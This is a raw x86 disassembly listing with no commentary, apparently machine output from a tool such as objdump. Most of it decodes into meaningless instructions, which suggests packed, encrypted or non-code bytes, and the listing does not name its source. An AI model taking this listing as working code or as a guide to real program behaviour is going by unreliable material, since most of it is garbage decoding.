  413bb8:	sub    eax,0x18880c27
  413bbd:	lds    eax,FWORD PTR [edi+0x1617140e]
  413bc3:	push   edx
  413bc4:	or     DWORD PTR ds:0xf7a7c689,esi
  413bca:	or     ecx,esp
  413bcc:	mov    esi,0x110eeeda
  413bd1:	cmp    BYTE PTR [ebp+0x76],ch
  413bd4:	fist   DWORD PTR [esi+0x7bb72bde]
  413bda:	in     eax,dx
  413bdb:	jl     0x413c23
  413bdd:	leave  
  413bde:	mov    es,WORD PTR [edi+ebx*2]
  413be1:	or     eax,0x3d177bc1
  413be6:	js     0x413bcd
  413be8:	mov    WORD PTR [edi],ds
  413bea:	gs xchg esp,eax
  413bec:	les    ebx,FWORD PTR [edi-0x25fdb7bb]
  413bf2:	adc    al,ch
  413bf4:	pop    ebx
  413bf5:	inc    esp
  413bf6:	repz xchg esi,eax
  413bf8:	fnstcw WORD PTR [edi-0x56]
  413bfb:	std    
  413bfc:	add    BYTE PTR ds:0x35963e7d,ch
  413c02:	js     0x413c43
  413c04:	fwait
  413c05:	call   0xc05:0xf70e30cc
  413c0c:	sub    edx,edi
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	repnz mov cl,0x1c
  413c2c:	pushf  
  413c2d:	add    al,BYTE PTR [eax]
  413c2f:	jg     0x413ca9
  413c31:	in     eax,0x7e
  413c33:	js     0x413cad
  413c35:	in     al,dx
  413c36:	cwde   
  413c37:	ja     0x413c10
  413c39:	fst    DWORD PTR [ecx+0x2022a482]
  413c3f:	and    DWORD PTR [edi],ebx
  413c41:	push   0x7e
  413c43:	je     0x413cb4
  413c45:	add    esp,ecx
  413c47:	pop    edx
  413c48:	mov    bl,BYTE PTR [eax+0x62]
  413c4b:	mov    edi,DWORD PTR [ebx-0x21]
  413c4e:	stos   BYTE PTR es:[edi],al
  413c4f:	cmp    eax,DWORD PTR [edx+0x11d6ba28]
  413c55:	or     DWORD PTR [ebx-0x5d],ecx
  413c58:	xchg   esp,eax
  413c59:	push   0xffffffb6
  413c5b:	mov    eax,0x10070fdd
  413c60:	imul   esi
  413c62:	repnz push ebp
  413c64:	aaa    
  413c65:	pcmpgtw mm7,QWORD PTR [ecx-0x43]
  413c69:	dec    edi
  413c6a:	in     eax,0x98
  413c6c:	call   0x74d64f53
  413c71:	jmp    0x2594:0xd2ffd2c8
  413c78:	fcom   QWORD PTR [ebx]
  413c7a:	mov    esp,0xa04858ee
  413c7f:	xlat   BYTE PTR ds:[ebx]
  413c80:	jns    0x413c9f
  413c82:	les    edx,FWORD PTR [edx]
  413c84:	fstp   DWORD PTR [ecx+0x476a581c]
  413c8a:	cmp    BYTE PTR [esi],cl
  413c8c:	lods   eax,DWORD PTR ds:[esi]
  413c8d:	cmp    ah,bl
  413c8f:	add    BYTE PTR [edi+0xf],0x6c
  413c93:	icebp  
  413c94:	push   edi
  413c95:	jle    0x413c4e
  413c97:	xor    edi,DWORD PTR [edx-0x3b38a119]
  413c9d:	ja     0x413c1f
  413c9f:	dec    ebp
  413ca0:	bound  ecx,QWORD PTR [ebx+0x12]
  413ca3:	out    dx,eax
  413ca4:	outs   dx,DWORD PTR ds:[esi]
  413ca5:	ss dec edi
  413ca7:	mov    cl,0xde
  413ca9:	dec    esi
  413caa:	push   0xffffffeb
  413cac:	xchg   ecx,eax
  413cad:	int3   
  413cae:	gs and dl,bl
  413cb1:	gs jl  0x413d0b
  413cb4:	lock int 0x58
  413cb7:	cdq    
  413cb8:	mov    ebp,0xb8e3f8f4
  413cbd:	adc    BYTE PTR [esi+0x5],ah
  413cc0:	scas   al,BYTE PTR es:[edi]
  413cc1:	push   0x9f458645
  413cc6:	jnp    0x413c6e
  413cc8:	dec    edx
  413cc9:	adc    DWORD PTR [edi-0x80],0xfffffff6
  413ccd:	retf   
  413cce:	or     DWORD PTR [eax-0x2cf2cece],ebp
  413cd4:	int3   
  413cd5:	dec    ecx
  413cd6:	jmp    0x1ec4acd3
  413cdb:	pop    esi
  413cdc:	out    dx,eax
  413cdd:	jl     0x413c79
  413cdf:	xor    al,0xef
  413ce1:	shr    BYTE PTR [eax+0x4d],cl
  413ce4:	fisubr DWORD PTR [edx-0x6a]
  413ce7:	scas   eax,DWORD PTR es:[edi]
  413ce8:	inc    ebx
  413ce9:	cwde   
  413cea:	jge    0x413d47
  413cec:	rcr    DWORD PTR [eax+eiz*2+0x27],0xd1
  413cf1:	enter  0xc6e6,0x24
  413cf5:	shl    dl,1
  413cf7:	fmul   QWORD PTR [ebp-0x4405d36]
  413cfd:	into   
  413cfe:	jg     0x413d7e
  413d00:	gs je  0x413d1d
  413d03:	bound  ebx,QWORD PTR [ebp+0xc]
  413d06:	ja     0x413cee
  413d08:	cmp    al,0x1b
  413d0a:	xor    eax,0x44806078
  413d0f:	cmp    cl,BYTE PTR [ecx+0x1ca58609]
  413d15:	idiv   BYTE PTR [ecx+0x7a]
  413d18:	xchg   edx,eax
  413d19:	add    DWORD PTR [eax+ecx*4],esi
  413d1c:	clc    
  413d1d:	aad    0x46
  413d1f:	sbb    al,0xf9
  413d22:	or     eax,0xe0652a4
  413d27:	sahf   
  413d28:	push   cs
  413d29:	lahf   
  413d2a:	dec    esi
  413d2b:	cmp    eax,DWORD PTR [ebx+ecx*2+0xc]
  413d2f:	push   esi
  413d30:	dec    esi
  413d31:	or     BYTE PTR [ebx+0x16],0x36
  413d35:	dec    eax
  413d36:	into   
  413d37:	popa   
  413d38:	out    dx,eax
  413d39:	adc    eax,0x51e7eb7b
  413d3e:	push   es
  413d3f:	inc    ebx
  413d40:	mov    ch,al
  413d42:	iret   
  413d43:	es mov eax,0xfd20b448
  413d49:	cmp    eax,edx
  413d4b:	loopne 0x413db2
  413d4d:	out    dx,al
  413d4e:	xchg   ebp,eax
  413d4f:	loope  0x413d72
  413d51:	sahf   
  413d52:	rcl    edx,cl
  413d54:	xor    al,0xa7
  413d56:	and    bl,BYTE PTR [edi]
  413d58:	push   0x13
  413d5a:	ret    
  413d5b:	cld    
  413d5c:	sub    BYTE PTR [eax-0x4d],ah
  413d5f:	adc    edi,DWORD PTR [ebx-0x80]
  413d62:	fldcw  WORD PTR [ebx-0x50]
  413d65:	add    edi,DWORD PTR [ecx+0x49]
  413d68:	inc    eax
  413d69:	cmp    al,bh
  413d6b:	dec    edi
  413d6c:	or     bl,BYTE PTR ds:0xb3a3a0e2
  413d72:	nop
  413d73:	clc    
  413d74:	call   0x6357:0xf01101a9
  413d7b:	add    al,0x36
  413d7d:	push   ebp
  413d7e:	fmul   QWORD PTR ds:[edi-0x70]
  413d82:	data16 xchg BYTE PTR [ecx],ah
  413d85:	sub    bl,bh
  413d87:	adc    ebp,DWORD PTR ds:0x2d907479
  413d8d:	mov    ebp,0xb15bf1d4
  413d92:	mov    edx,DWORD PTR [ebp-0x28]
  413d95:	xchg   edx,eax
  413d96:	lds    eax,FWORD PTR [ebx]
  413d98:	jp     0x413d20
  413d9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d9b:	mov    dh,0x66
  413d9d:	and    al,0xa2
  413d9f:	rcr    ah,cl
  413da1:	adc    al,0x6f
  413da3:	fucom  st(4)
  413da5:	push   ebx
  413da6:	sub    ebx,edx
  413da8:	loop   0x413d38
  413daa:	pop    es
  413dab:	shl    BYTE PTR [esi-0x6c],1
  413dae:	ss push ss
  413db0:	xchg   ebp,eax
  413db1:	and    eax,0xd031c8db
  413db6:	inc    edi
  413db7:	stos   DWORD PTR es:[edi],eax
  413db8:	mov    ebx,fs
  413dba:	ins    DWORD PTR es:[edi],dx
  413dbb:	sub    dl,BYTE PTR [ecx+0x1a]
  413dbe:	fstp   TBYTE PTR [ebp-0x4812dcea]
  413dc4:	in     al,dx
  413dc5:	jae    0x413d7b
  413dc7:	sub    DWORD PTR [edx],edi
  413dc9:	leave  
  413dca:	jge    0x413de4
  413dcc:	sub    bh,BYTE PTR [esi+0x16]
  413dcf:	inc    esp
  413dd0:	in     al,0x5a
  413dd2:	lea    edi,[ebp+0x5bc271c9]
  413dd8:	jns    0x413e44
  413dda:	and    al,0xc5
  413ddc:	loop   0x413df1
  413dde:	sbb    al,0xf7
  413de0:	rcr    edi,1
  413de2:	lds    esp,FWORD PTR [eax+0x2925099f]
  413de8:	shr    DWORD PTR [ebx-0x14c0539d],0xc4
  413def:	cld    
  413df0:	pop    edx
  413df1:	ficomp DWORD PTR [ecx+ecx*1]
  413df4:	inc    edi
  413df5:	xlat   BYTE PTR ds:[ebx]
  413df6:	sbb    eax,0x5ace9eab
  413dfb:	mov    dh,0x31
  413dfd:	xor    edi,edi
  413dff:	sub    ebp,DWORD PTR [eax-0x78]
  413e02:	or     bh,dh
  413e04:	and    al,0xaa
  413e06:	fwait
  413e07:	cld    
  413e08:	mov    ebx,0x78ba9f0a
  413e0d:	out    dx,eax
  413e0e:	inc    edx
  413e0f:	inc    ebx
  413e10:	mov    edx,0x289a75f0
  413e15:	sub    BYTE PTR [eax-0x7a],bl
  413e18:	(bad)  
  413e1b:	jo     0x413db5
  413e1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e1e:	ins    BYTE PTR es:[edi],dx
  413e1f:	ins    DWORD PTR es:[edi],dx
  413e20:	inc    esp
  413e21:	adc    BYTE PTR [edi],ah
  413e23:	sti    
  413e24:	imul   ecx,DWORD PTR [ebx-0x5e],0x65c92c5f
  413e2b:	sbb    DWORD PTR [esi+0x6e],ecx
  413e2e:	push   cs
  413e2f:	bound  edx,QWORD PTR [eax]
  413e31:	xchg   esi,eax
  413e32:	push   esi
  413e33:	add    esi,DWORD PTR [esi+0x2cee480]
  413e39:	stos   BYTE PTR es:[edi],al
  413e3a:	inc    ebx
  413e3b:	cmp    BYTE PTR [ecx],0x39
  413e3e:	cs mov cl,0x7d
  413e41:	pushf  
  413e42:	enter  0x57d2,0x9c
  413e46:	add    eax,0x9aed76fa
  413e4b:	in     al,0x9
  413e4d:	fs jecxz 0x413e72
  413e50:	adc    DWORD PTR [edx+0x7c61c91e],eax
  413e56:	sbb    esp,DWORD PTR [esi+0x988c484]
  413e5c:	dec    ecx
  413e5d:	inc    esi
  413e5e:	frstor [eax-0x6590dea1]
  413e64:	int3   
  413e65:	push   edi
  413e66:	jns    0x413e3e
  413e68:	data16 sub dl,al
  413e6b:	jl     0x413e98
  413e6d:	mov    esp,0x19c9976c
  413e72:	cld    
  413e73:	xor    BYTE PTR [edi*1+0x9f4b870],0x24
  413e7b:	dec    esi
  413e7c:	xchg   edi,eax
  413e7d:	in     al,dx
  413e7e:	in     eax,0xd2
  413e80:	out    0xb3,eax
  413e82:	or     DWORD PTR [ebp+ebp*1-0x65],ecx
  413e86:	adc    al,0xfe
  413e88:	dec    ecx
  413e89:	inc    ecx
  413e8a:	push   0xffffff9c
  413e8c:	mov    gs,WORD PTR [eax]
  413e8e:	les    ebp,FWORD PTR [esi-0x6b5c2626]
  413e94:	mov    al,0x8c
  413e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e97:	retf   
  413e98:	fisttp WORD PTR [esi+0x56a026b2]
  413e9e:	rcl    BYTE PTR [eax],cl
  413ea0:	imul   edi,ebx
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	pop    ss
  413eb8:	inc    ecx
  413eb9:	mov    esi,0x7f06ef3a
  413ebe:	js     0x413ea5
  413ec0:	jle    0x413f3a
  413ec2:	js     0x413ebe
  413ec4:	jge    0x413e56
  413ec6:	div    DWORD PTR [eax]
  413ec8:	jp     0x413e94
  413eca:	or     ebp,edi
  413ecc:	xor    eax,0x79badf68
  413ed1:	push   esp
  413ed2:	out    0x59,al
  413ed4:	arpl   WORD PTR ds:0x9d028cf3,dx
  413eda:	jecxz  0x413f23
  413edc:	je     0x413ed8
  413ede:	les    eax,FWORD PTR [edi]
  413ee0:	mov    ebp,DWORD PTR [ebp+0x61a416b3]
  413ee6:	nop
  413ee7:	inc    esp
  413ee8:	scas   eax,DWORD PTR es:[edi]
  413ee9:	xchg   esi,eax
  413eea:	stos   DWORD PTR es:[edi],eax
  413eeb:	je     0x413f51
  413eed:	push   edi
  413eee:	xchg   ecx,ebp
  413ef0:	push   ebx
  413ef1:	enter  0x9a0a,0x49
  413ef5:	and    ebp,eax
  413ef7:	xlat   BYTE PTR ds:[ebx]
  413ef8:	cs call 0xf16:0xeaee162b
  413f00:	shr    DWORD PTR [ebx-0x4e441a48],1
  413f06:	out    dx,eax
  413f07:	push   ss
  413f08:	xchg   ebp,eax
  413f09:	mov    ds:0x73069932,eax
  413f0e:	or     eax,DWORD PTR [edx-0x6d26989b]
  413f14:	shl    BYTE PTR [esi],cl
  413f16:	enter  0x180f,0x99
  413f1a:	pushf  
  413f1b:	xlat   BYTE PTR ds:[ebx]
  413f1c:	inc    eax
  413f1d:	ja     0x413ec0
  413f1f:	jg     0x413f00
  413f21:	pushf  
  413f22:	jne    0x413f83
  413f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f25:	clc    
  413f26:	ret    
  413f27:	push   cs
  413f28:	dec    esi
  413f29:	leave  
  413f2a:	dec    bl
  413f2c:	outs   dx,DWORD PTR ds:[esi]
  413f2d:	sbb    ah,dh
  413f2f:	andnps xmm0,XMMWORD PTR ds:0x69a38adb
  413f36:	into   
  413f37:	push   ebp
  413f38:	stos   DWORD PTR es:[edi],eax
  413f39:	sub    BYTE PTR ds:[ebx+0x2fb409ff],0x71
  413f41:	(bad)
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	mov    eax,0x13a6d050
  413f4a:	xchg   esp,eax
  413f4b:	fld    st(6)
  413f4d:	shr    DWORD PTR [eax+0x30],cl
  413f50:	push   0xffffffe1
  413f52:	shr    DWORD PTR [esi],1
  413f54:	aam    0x18
  413f56:	sub    bl,BYTE PTR [esi]
  413f58:	mov    BYTE PTR [eax-0x530558a3],bh
  413f5e:	inc    esi
  413f5f:	cmp    BYTE PTR [ebp+0x43150274],ah
  413f65:	repnz mov edi,0xbf85f6ef
  413f6b:	arpl   WORD PTR [edx],ax
  413f6d:	adc    eax,0x2ea97503
  413f72:	loopne 0x413f91
  413f74:	out    dx,eax
  413f75:	rcr    al,0xf1
  413f78:	add    ebp,DWORD PTR [eax+0x4ae60ad6]
  413f7e:	out    0xf1,al
  413f80:	les    esi,FWORD PTR [edx]
  413f82:	ds sahf 
  413f84:	xor    esi,DWORD PTR [edx-0x7fdd8e31]
  413f8a:	pop    esi
  413f8b:	or     edi,ebx
  413f8d:	pushf  
  413f8e:	test   edx,esp
  413f90:	xor    cl,BYTE PTR [edx-0x71]
  413f93:	push   edx
  413f94:	push   edx
  413f95:	or     BYTE PTR [eax+esi*2+0x7806211c],ch
  413f9c:	and    al,0xcf
  413f9e:	int3   
  413f9f:	pop    ebp
  413fa0:	cmc    
  413fa1:	enter  0x8504,0xc9
  413fa5:	cmc    
  413fa6:	cld    
  413fa7:	inc    ecx
  413fa8:	scas   al,BYTE PTR es:[edi]
  413fa9:	fld    QWORD PTR [ebx+0x74]
  413fac:	loop   0x413f87
  413fae:	jmp    0xbf0151db
  413fb3:	aaa    
  413fb4:	sub    esi,esi
  413fb6:	(bad)  
  413fb7:	mov    edi,0x6af74587
  413fbc:	(bad)  
  413fbd:	das    
  413fbe:	cmc    
  413fbf:	mov    WORD PTR [ebp-0x5ee5ba75],cs
  413fc5:	cli    
  413fc6:	jae    0x413fb5
  413fc8:	aad    0xde
  413fca:	xor    BYTE PTR [esi-0x3f98de44],0x7c
  413fd1:	lods   eax,DWORD PTR ds:[esi]
  413fd2:	(bad)  
  413fd3:	cmc    
  413fd4:	inc    eax
  413fd5:	push   0xfffffff7
  413fd7:	pushf  
  413fd8:	xor    BYTE PTR [ebp*8+0x4f010857],ah
  413fdf:	mov    dl,0xe4
  413fe1:	xchg   esp,eax
  413fe2:	lods   eax,DWORD PTR ds:[esi]
  413fe3:	out    0x2e,eax
  413fe5:	into   
  413fe6:	cwde   
  413fe7:	int    0x54
  413fe9:	push   cs
  413fea:	cmp    esi,DWORD PTR ds:0x87052224
  413ff0:	loopne 0x41406c
  413ff2:	mov    ?,esi
  413ff4:	xor    ebp,eax
  413ff6:	cmp    eax,0x65d908e6
  413ffb:	dec    edi
  413ffc:	out    dx,eax
  413ffd:	mov    eax,ds:0x3742c70b
  414002:	inc    edi
  414003:	cld    
  414004:	add    cl,al
  414006:	mov    eax,0xd86b01c
  41400b:	(bad)  
  41400c:	and    BYTE PTR [edx-0x49c49e6a],bh
  414012:	imul   edi,DWORD PTR [eax+0x78],0x1
  414016:	cs aaa 
  414018:	inc    edx
  414019:	sbb    al,0xe
  41401b:	inc    esp
  41401c:	cmp    al,0xc2
  41401e:	push   es
  41401f:	leave  
  414020:	lods   eax,DWORD PTR ds:[esi]
  414021:	lods   eax,DWORD PTR ds:[esi]
  414022:	leave  
  414023:	or     ebp,0x13
  414026:	dec    ebp
  414027:	sahf   
  414028:	adc    eax,DWORD PTR [edx]
  41402a:	rcl    ah,1
  41402c:	in     al,dx
  41402d:	ss sbb eax,0x419bc50
  414033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414034:	adc    edi,DWORD PTR [ecx-0x4]
  414037:	mov    ebx,0x8290a058
  41403c:	into   
  41403d:	or     eax,0x344e0d34
  414042:	cmp    al,0x4f
  414044:	inc    esp
  414045:	ins    DWORD PTR es:[edi],dx
  414046:	ror    DWORD PTR [ebx-0x640c0a67],0x2
  41404d:	aas    
  41404e:	das    
  41404f:	scas   eax,DWORD PTR es:[edi]
  414050:	dec    ecx
  414051:	fistp  QWORD PTR [ecx+0x72718782]
  414057:	sub    al,0x57
  414059:	xlat   BYTE PTR ds:[ebx]
  41405a:	rcl    eax,1
  41405c:	mov    eax,ds:0x10912cbf
  414061:	add    bl,0x4c
  414064:	push   ebx
  414065:	jno    0x414076
  414067:	sahf   
  414068:	cmp    eax,0x2f74c94e
  41406d:	sub    ah,BYTE PTR [ebp+ebx*1+0x54]
  414071:	cs leave 
  414073:	fild   QWORD PTR [edi+0x79]
  414077:	sub    DWORD PTR [eax+0x2c],esi
  41407a:	adc    cl,0xf5
  41407d:	jl     0x414033
  41407f:	int3   
  414080:	jp     0x41401f
  414082:	adc    cl,BYTE PTR [eax-0x580068c3]
  414088:	pushf  
  414089:	mov    ds:0x2318a5fe,al
  41408e:	dec    esp
  41408f:	test   ecx,eax
  414091:	jp     0x41406d
  414093:	repz jge 0x414088
  414096:	jns    0x414049
  414098:	(bad)  
  41409a:	add    DWORD PTR [bx],ebp
  41409d:	pusha  
  41409e:	lds    ecx,FWORD PTR [ebp+edi*1-0x3a]
  4140a2:	sub    BYTE PTR [edi],ch
  4140a4:	jecxz  0x414041
  4140a6:	arpl   WORD PTR [ecx+0x739d29ee],sp
  4140ac:	dec    esi
  4140ad:	xor    cl,BYTE PTR gs:[ebx-0x6e]
  4140b1:	daa    
  4140b2:	sub    edx,DWORD PTR [edx+0x2d]
  4140b5:	xchg   ebp,eax
  4140b6:	cdq    
  4140b7:	xor    ah,BYTE PTR [ebp+0x6ad99e78]
  4140bd:	iret   
  4140be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140bf:	ins    BYTE PTR es:[edi],dx
  4140c0:	rcl    BYTE PTR [edx-0x5c],0x40
  4140c4:	jmp    0x4140db
  4140c6:	and    eax,ebp
  4140c8:	and    BYTE PTR ds:0x7eada2ec,bl
  4140ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140cf:	mov    BYTE PTR [ecx+0x18d38d6b],dh
  4140d5:	and    eax,0x91d66265
  4140da:	sub    cl,cl
  4140dc:	fimul  WORD PTR [eax+0x48f74ba2]
  4140e2:	xchg   DWORD PTR [edx+0x61b4b53b],edx
  4140e8:	or     eax,0x840e0b4d
  4140ed:	jle    0x41408d
  4140ef:	and    cl,BYTE PTR [edi]
  4140f1:	aas    
  4140f2:	add    edi,edi
  4140f4:	push   ecx
  4140f5:	lahf   
  4140f6:	push   0xffffffae
  4140f8:	or     al,0x6f
  4140fa:	retf   
  4140fb:	sub    BYTE PTR [edi+ebp*8+0x70],al
  4140ff:	arpl   dx,cx
  414101:	imul   BYTE PTR [esi-0x19]
  414104:	clc    
  414105:	pop    ss
  414106:	xor    al,0x2
  414108:	pop    eax
  414109:	cmp    esi,edi
  41410b:	int3   
  41410c:	cdq    
  41410d:	es pop edx
  41410f:	(bad)  
  414110:	daa    
  414111:	adc    eax,0x94264ce
  414116:	stc    
  414117:	inc    esi
  414118:	sub    dl,BYTE PTR [eax+0x6a]
  41411b:	popf   
  41411c:	mov    ds:0xfb497093,eax
  414121:	test   BYTE PTR [edx-0x4b],0x43
  414125:	iret   
  414126:	popf   
  414127:	lods   al,BYTE PTR ds:[esi]
  414128:	outs   dx,BYTE PTR ds:[esi]
  414129:	jecxz  0x414119
  41412b:	mov    al,0xa6
  41412d:	loope  0x414162
  41412f:	fsubr  st,st(1)
  414131:	add    DWORD PTR [edx],0x0
  414134:	add    ah,al
  414136:	aas    
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0x1a145a14
  414142:	and    DWORD PTR [eax+0x7f0454a9],0x78
  414149:	in     eax,0x7e
  41414b:	js     0x4141c5
  41414d:	sub    al,0x11
  41414f:	sbb    cl,dh
  414151:	mov    dh,0x9f
  414153:	and    al,0xa7
  414156:	ficom  DWORD PTR [esi+eiz*2-0x365e5034]
  41415d:	pop    ebp
  41415e:	cmp    al,0x23
  414160:	pop    ebx
  414161:	or     esi,edi
  414163:	inc    edi
  414164:	mov    edi,?
  414166:	dec    esp
  414167:	pusha  
  414168:	int    0x19
  41416a:	in     eax,0x73
  41416c:	mov    ecx,0x925b5cf5
  414171:	dec    edi
  414172:	and    dh,cl
  414174:	jge    0x414114
  414176:	into   
  414177:	dec    ebp
  414178:	aad    0xb6
  41417a:	fimul  DWORD PTR [ecx+0x4e]
  41417d:	xchg   dh,dh
  41417f:	xor    DWORD PTR ds:0xc44fc239,0x5127f43c
  414189:	and    bh,BYTE PTR [ebp-0x70]
  41418c:	dec    esi
  41418d:	jbe    0x414184
  41418f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  414191:	shr    ch,0x2f
  414194:	in     al,0x89
  414196:	outs   dx,BYTE PTR ds:[esi]
  414197:	popf   
  414198:	jnp    0x414182
  41419a:	sub    al,0x5f
  41419c:	retf   0x1544
  41419f:	test   eax,esi
  4141a1:	sub    DWORD PTR [esi-0x74b26766],ebp
  4141a7:	or     al,0xc4
  4141a9:	pop    ss
  4141aa:	clc    
  4141ab:	or     al,bh
  4141ad:	das    
  4141ae:	mov    ebx,0x16a45f13
  4141b3:	icebp  
  4141b4:	test   dh,ch
  4141b6:	rcl    DWORD PTR [ecx-0x75e3f6fa],cl
  4141bc:	pop    ds
  4141bd:	fmul   st(4),st
  4141bf:	hlt    
  4141c0:	jns    0x414158
  4141c2:	jae    0x41420d
  4141c4:	mov    esp,0x87fd49f8
  4141c9:	les    edx,FWORD PTR [ebp+0x15044ac9]
  4141cf:	das    
  4141d0:	lock in eax,0x77
  4141d3:	aaa    
  4141d4:	fwait
  4141d5:	sbb    DWORD PTR [esi-0x1c],esp
  4141d8:	pop    esi
  4141d9:	clc    
  4141da:	retf   
  4141db:	test   BYTE PTR [ebp+0x51],al
  4141de:	imul   edx,DWORD PTR [ebx],0xa424848b
  4141e4:	bound  ebx,QWORD PTR [ebp-0x7e56808d]
  4141ea:	adc    edi,DWORD PTR [ecx+0x69a8208c]
  4141f0:	(bad)  
  4141f1:	popa   
  4141f2:	jno    0x4141a0
  4141f4:	xchg   ecx,eax
  4141f5:	shl    DWORD PTR [edx-0x3b],0x4f
  4141f9:	in     eax,dx
  4141fa:	xchg   DWORD PTR [edi],eax
  4141fc:	aam    0xd7
  4141fe:	jno    0x414245
  414200:	rol    BYTE PTR [ebx+0x280e23e8],1
  414206:	in     eax,dx
  414207:	cdq    
  414208:	nop
  414209:	test   DWORD PTR [esp+eax*8],eax
  41420c:	mov    eax,ds:0xf6d628a4
  414211:	cmp    dl,dl
  414213:	ins    BYTE PTR es:[edi],dx
  414214:	popa   
  414215:	xchg   ebx,eax
  414216:	cmp    DWORD PTR [eax-0x58],ebp
  414219:	jnp    0x4141bb
  41421b:	add    eax,0xdafa4608
  414220:	jno    0x4141a8
  414222:	(bad)  
  414223:	mov    ecx,0x7e5fc375
  414228:	ret    
  414229:	rcr    dl,0xdb
  41422c:	aas    
  41422d:	pop    es
  41422e:	js     0x414248
  414230:	and    al,BYTE PTR [eax-0x5d92be8d]
  414236:	mov    al,ds:0x4b108087
  41423b:	push   ss
  41423c:	into   
  41423d:	imul   esi,DWORD PTR [esp+edi*4-0x14b9817b],0xa
  414245:	sub    DWORD PTR [esi],ecx
  414247:	push   0xd
  414249:	data16 or BYTE PTR ss:[edi+ebx*1],cl
  41424e:	daa    
  41424f:	repz jmp 0x4142a2
  414252:	dec    esp
  414253:	push   edx
  414254:	(bad)  
  414255:	icebp  
  414256:	xchg   edi,eax
  414257:	rcr    al,cl
  414259:	mov    al,0x79
  41425b:	test   BYTE PTR [edx-0x1ba0613e],ah
  414261:	lods   al,BYTE PTR ds:[esi]
  414262:	adc    cl,bl
  414264:	dec    esp
  414265:	lahf   
  414266:	jp     0x4142c5
  414268:	mov    eax,0xd10a6f7b
  41426d:	int3   
  41426e:	stc    
  41426f:	outs   dx,BYTE PTR ds:[esi]
  414270:	or     BYTE PTR [ebx-0x32],0xba
  414274:	fistp  QWORD PTR [ecx]
  414276:	jmp    0x84a3754b
  41427b:	adc    al,0x1c
  41427d:	add    eax,0xdfb8bd2
  414282:	(bad)  
  414284:	mov    bl,0xbd
  414286:	cmc    
  414287:	fcmovne st,st(0)
  414289:	je     0x414281
  41428b:	repnz retf 0x4254
  41428f:	dec    edi
  414290:	push   edx
  414291:	jo     0x414250
  414293:	pop    ss
  414294:	fdiv   QWORD PTR [edi-0x143574ed]
  41429a:	test   cl,al
  41429c:	shl    BYTE PTR [esi+0x40],1
  41429f:	dec    eax
  4142a0:	repnz or eax,DWORD PTR [ebx+edi*8-0x424c530e]
  4142a8:	inc    ebx
  4142a9:	cli    
  4142aa:	mov    WORD PTR [ebp+0x10],gs
  4142ad:	es hlt 
  4142af:	push   ss
  4142b0:	inc    ecx
  4142b1:	mov    ds:0x613f9dc1,al
  4142b6:	aas    
  4142b7:	(bad)  [ebx-0x2e]
  4142ba:	out    0x12,eax
  4142bc:	jo     0x4142d0
  4142be:	dec    edi
  4142bf:	pop    esi
  4142c0:	cwde   
  4142c1:	cmp    esp,ecx
  4142c3:	cmp    cl,dl
  4142c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142c6:	(bad)  
  4142c8:	sbb    al,0x39
  4142ca:	and    al,0xa1
  4142cc:	int    0x21
  4142ce:	mov    bl,0xb8
  4142d0:	dec    ebp
  4142d1:	pop    ecx
  4142d2:	inc    ecx
  4142d3:	ins    DWORD PTR es:[edi],dx
  4142d4:	add    BYTE PTR [ecx],al
  4142d6:	imul   ebp,DWORD PTR [esi+0x594b4dc0],0xcd4cda4b
  4142e0:	add    al,0xc1
  4142e2:	test   al,0x19
  4142e4:	(bad)  
  4142e5:	in     al,0x36
  4142e7:	add    eax,0x228689e1
  4142ec:	sub    BYTE PTR ds:0x2be2ad3b,dh
  4142f2:	xchg   ecx,eax
  4142f3:	nop
  4142f4:	cmc    
  4142f5:	clc    
  4142f6:	data16 sub al,0xc3
  4142f9:	icebp  
  4142fa:	out    0xa2,al
  4142fc:	add    eax,ebp
  4142fe:	ret    
  4142ff:	xor    BYTE PTR [esi],bh
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	adc    dh,dl
  414304:	int    0x6e
  414306:	arpl   bp,cx
  414308:	sbb    edx,DWORD PTR [ebx]
  41430a:	in     al,0x27
  41430c:	std    
  41430d:	(bad)  
  41430e:	fmul   DWORD PTR [eax+0x6d5d040a]
  414314:	icebp  
  414315:	cli    
  414316:	jmp    0x414336
  414318:	xor    al,BYTE PTR [edi+0xd]
  41431b:	add    al,0x2e
  41431d:	adc    BYTE PTR [esi],bh
  41431f:	mov    cl,0xac
  414321:	dec    ecx
  414322:	xchg   esi,eax
  414323:	mov    ebx,0x3eccfe1d
  414328:	xchg   ebp,eax
  414329:	push   cs
  41432a:	mov    ds,WORD PTR [ecx+0x5f1a2b47]
  414330:	inc    ebx
  414331:	xor    DWORD PTR [edi-0x2d],ecx
  414334:	bound  eax,QWORD PTR ds:0x24911d05
  41433a:	pop    esi
  41433b:	in     eax,0x52
  41433d:	xor    eax,0xb7f91f66
  414342:	xchg   BYTE PTR [edx+0x2a1b95c7],cl
  414348:	out    dx,al
  414349:	mov    ds:0x8c2f7917,al
  41434e:	int    0x2
  414350:	lock inc eax
  414352:	jo     0x414377
  414354:	loope  0x414383
  414356:	lods   eax,DWORD PTR ds:[esi]
  414357:	sub    ebp,DWORD PTR [edx-0x75]
  41435a:	(bad)  
  41435b:	xchg   esi,eax
  41435c:	or     al,0x18
  41435e:	cmc    
